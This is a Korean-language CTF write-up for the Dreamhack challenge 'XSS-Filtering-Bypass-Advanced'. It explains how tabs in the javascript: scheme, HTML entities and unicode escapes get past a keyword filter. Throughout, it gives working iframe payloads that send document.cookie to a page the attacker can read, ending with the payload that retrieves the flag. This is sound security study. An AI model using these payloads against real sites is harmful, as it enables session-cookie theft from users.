# Challenge: dreamhack - XSS-Filtering-Bypass-Advanced

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/434/
XSS-Filtering-Bypass 문제에서 필터링 기능이 강화되었다.


## 추가 학습
### 정규화 악용

* 브라우저의 정규화는 사용자가 입력하거나 링크를 통해 요청하는 URL을 일관된 형식으로 변환하는 과정을 말한다.
    * 여러 URL이 같은 컨텐츠를 가리킬 때 이를 같은 페이지로 인식하게끔 해준다
    * 소문자 변환, 불필요한 포트 번호, 쿼리 스트링에서 순서 변경, URL 경로의 ./나 ../ 제거
    * URL 파싱 규칙에 의해 탭/개행이 제거된다.
* 이를 악용해 필터링 대상 키워드 사이에 특수 문자를 집어넣어 필터링을 우회할 수 있다.


### 페이로드의 코드 복원
    * 아래 코드는 네 가지 인코딩/변형이 섞여있다. s를 나타내는 &#x73;, tab, url encode, \u0064 같은 javascript unicode escape이다.
    ```javascript
    <iframe src="java&#x73;cr	ipt:\u0064ocument.locati\&#x75;006fn.href = '/memo?memo=' + %5Cu0064ocument.cookie;"/>
    ```
    * 브라우저의 처리 순서는 다음과 같다.
        1. HTML 파서 단계 : HTML 소스를 읽으면서 HTML Entity를 먼저 해석한다. 속성값 안에 있는 제어문자(탭, 개행 등)를 프로토콜 판별 시 무시하거나 공백으로 변환한다.
        위 코드에서는 &#x73이 s로 변환되고, \&#x75는 u로 변환되어 \u006f로 다시 유니코드 이스케이프 시퀀스 형태가 된다.
        2. URL 프로토콜 판별 : HTML 파서가 src 값에서 javascript:를 확인한다. 이때 탭, 개행, 일부 공백은 무시하고 비교하므로 cr ipt 사이의 탭은 무시되고 script로 인식된다. 이 과정에서 %5c가 \로 변환된다.
        3. 자바스크립트 실행 컨텍스트 진입 : 브라우저가 javascript: URL을 만나 그 뒤 부분을 JS 코드로 실행
        4. JS 파서 단계 : 유니코드가 해석된다. \u0064가 d로, \u006f가 o로 바뀐다.
    



## 문제 풀이
step 1 - 필터링 확인
* app.py의 필터링 기능부터 확인하자. filter는 script, on. javascript 키워드가 있으면 대소문자 구분없이 원본 텍스트에서 제거한다. 이후, advanced_filter는 window, self, this, document, location, 소괄호, $#까지도 차단한다. $#을 차단한다는 것은 HTML entity encoding 우회를 차단하겠다는 의미이다.
    ```python
    def xss_filter(text):
        _filter = ["script", "on", "javascript"]
        for f in _filter:
            if f in text.lower():
                return "filtered!!!"

        advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
        for f in advanced_filter:
            if f in text.lower():
                return "filtered!!!"

        return text
    ```
step 2 - 우회 방법
* 우선 이전 XSS-Filtering-Bypass와 달리 필터링 로직에서 replace 부분이 빠졌다. 따라서 scrscriptipt와 같이 우회하는 것은 통하지 않는다. 필터링이 막히지 않은 문자를 생각해보자. 대괄호 []와 +입력이 가능하니 Computed Member Access가 아직 가능할 것이다. document도 차단 대상이므로 이번에는 document['locatio'+'n']도 사용하지 못한다.
* 하지만 아직 Unicode Escape Sequence가 가능해보인다. script 태그를 사용하지 않고 자바스크립트 코드 내에는 Unicode Escape Sequence를 사용하면 우회 가능해보인다.
* 아래의 여러 시행착오 끝에 unicode escape sequence와 javascript: 사이에 집어넣은 탭을 넣어 정규화를 이용하면 우회할 수 있다. 참고로 탭은 vs code 기본 설정에서 스페이스 입력으로 되어있기 때문에... 메모장에서 탭을 적용시키고 복사해 폼에 제출하는 것이 좋다.


## 시행착오
* 길이 제한이 없으니 JSfuck을 이용해보려 했으니 소괄호 필터링으로 차단된다. 
* html entity encoding, 정규화, unicode escape sequence의 순서를 파악하기 위해 주어진 app.py에서 html entity encoding 필터링 부분을 지우고 시행착오를 겪어봤다. 

* ```<ifame~~>```를 읽으면 HTML 파서로 src 속성 값 전체를 읽고 그 값이 javascript: scheme이면 나머지를 javascript 파서에 넘겨서 실행한다. javascript: 내의 문자를 유니코드로 변환하면 실행되지 않는다.

    ```javascript
    <iframe src="java\u0073cript:locati\u006fn.href='/memo?memo='+d\u006fcument.cookie;">
    ```

* src="..."는 속성값(URL)이고 HTML 파서가 여기서 HTML entity인 &#x73;를 디코딩한다. 디코딩하고 값이 javascript:가 되면 브라우저는 이를 프로토콜로 인식하고 나머지를 JS 파서에 넘겨 실행한다. 따라서 동작한다.
    ```javascript
    <iframe src="java&#x73;cript:locati\u006fn.href='/memo?memo='+d\u006fcument.cookie;">
    ```
* 개행은 안 먹힌다.
    ```javascript
    <iframe src="javascr
    ipt:locati\u006fn.href='/memo?memo='+d\u006fcument.cookie;">
    ````
* 탭은 안먹히는 줄 알았으나 VS 코드 설정 때문이었다.
    ```javascript
    <iframe src="javas	cript:locati\u	006fn.href='/memo?memo='+d\u006fcument.co\tokie;">
    ```
* 메모장에 붙여넣고 복사한 실제 탭은 되는 것이었다.
    ```javascript
    <iframe src="javascr	ipt:\u0064ocument.locati\u006fn.href = '/memo?memo=' + \u0064ocument.cookie;"/>
    ```
* 스키마쪽에 html entity encoding을 넣어도 된다.
    ```javascript
    <iframe src="java&#x73;cr	ipt:\u0064ocument.locati\u006f\u006e.href = '/memo?memo=' + \u0064ocument.cookie;"/>
    ```

* 유니코드 이스케이프의 u를 html entity encoding해도 된다...
    ```javascript
    <iframe src="java&#x73;cr	ipt:\u0064ocument.locati\&#x75;006f\u006e.href = '/memo?memo=' + \u0064ocument.cookie;"/>
    ```
* 참고로 진짜 탭이 아니라 \t를 넣으면 안된다. 새로 test.html을 만들어 아래의 간단한 코드를 돌리고, 개발자도구에서 request URL을 보면 다음과 같이 나온다. file:///Users/~~~/javascr/tipt:alert(1). javascript 사이에 \t를 넣으면 서버 코드에서 param은 ```\\t```가 되고 quote 부분을 거치면 url에 붙는 해당 부분은 %5Ct가 된다. 따라서 랜더링할 때 javascr\tipt로 인식될텐데 /로 변환된 것으로 보아 백슬래쉬를 윈도우 경로 구문자로 생각하고 /로 변환한 것이 아닌가싶다.
    ```javascript
    <iframe src="javascr\tipt:alert(1)"/>
    ```
    * 그렇다면 왜 실제 탭은 되는걸까? 과정이 어떻게 될까? app.py 코드를 수정해 디버깅을 해보면 /flag에서 받은 param에서 해당 탭 부분은 \t로 변경된다. 아래 코드가 위 유니코드 이스케이프에 대해 entity encoding한 코드를 폼에 넣었을 때 서버 코드에서 받은 param의 값이다.
    '''javascript
    '<iframe src="java&#x73;cr\tipt:\\u0064ocument.locati\\&#x75;006f\\u006e.href = \'/memo?memo=\' + \\u0064ocument.cookie;"/>'
    '''
    * urllib.parse.quote(param)이 붙은 url은 다음과 같다.
    ```
    'http://127.0.0.1:8000/vuln?param=%3Ciframe%20src%3D%22java%26%23x73%3Bcr%09ipt%3A%5Cu0064ocument.locati%5C%26%23x75%3B006f%5Cu006e.href%20%3D%20%27/memo%3Fmemo%3D%27%20%2B%20%5Cu0064ocument.cookie%3B%22/%3E'
    ```


* URL 인코딩을 해서 보내도 된다. 이상하게도 "\"를 "%5C"로 바꿔서 보내도 동작한다. 
    ```javascript
    <iframe src="java&#x73;cr	ipt:\u0064ocument.locati\&#x75;006f\u006e.href = '/memo?memo=' + %5Cu0064ocument.cookie;"/>
    ```
    * 서버를 동작시켜 디버깅을 해보니 위 코드의 두 document 부분에 대해 urllib.parse.quote(param)의 값이 %5Cu0064ocument로 같다. url encoder로 돌려본 결과와는 상이하다. 따라서 정상적인 동작은 아닌 것 같다. 결과가 같으니 url decoding될 때 둘 다 \u0064로 인식되어 유니코드 인코딩될 때 d로 변환되어 실행된다. 개발자 도구에서 eval(decodeURIComponent("%5Cu0064ocument"));를 동작시키면 document 객체가 나오므로 인식된다.
    ```javascript
    'http://127.0.0.1:8000/vuln?param=%3Ciframe%20src%3D%22java%26%23x73%3Bcr%09ipt%3A%5Cu0064ocument.locati%5C%26%23x75%3B006f%5Cu006e.href%20%3D%20%27/memo%3Fmemo%3D%27%20%2B%20%255Cu0064ocument.cookie%3B%22/%3E'
    ```

* URL 인코딩을 적용할 때 burp suite로 어떻게 바뀌는지 확인해보는 것이 좋다. tab은 url 인코딩하면 %09인데, %09를 포함시켜 /flag의 폼으로 보내면, param은 한번 더 인코딩된 값인 %2509로 바뀌어있다. flask 서버에서 디코딩한 값이 param에 들어갈 것이고, urllib로 다시 이중 인코딩되어서 들어갈 것이다. burp suite에서 param을 이중 인코딩된 %2509가 아니라 %09로 바꿔주면 잘 동작한다. 



## 결과
폼에 ```<iframe src="java&#x73;cr	ipt:\u0064ocument.locati\&#x75;006fn.href = '/memo?memo=' + %5Cu0064ocument.cookie;"/>```를 입력하면 플래그가 /memo에 나온다.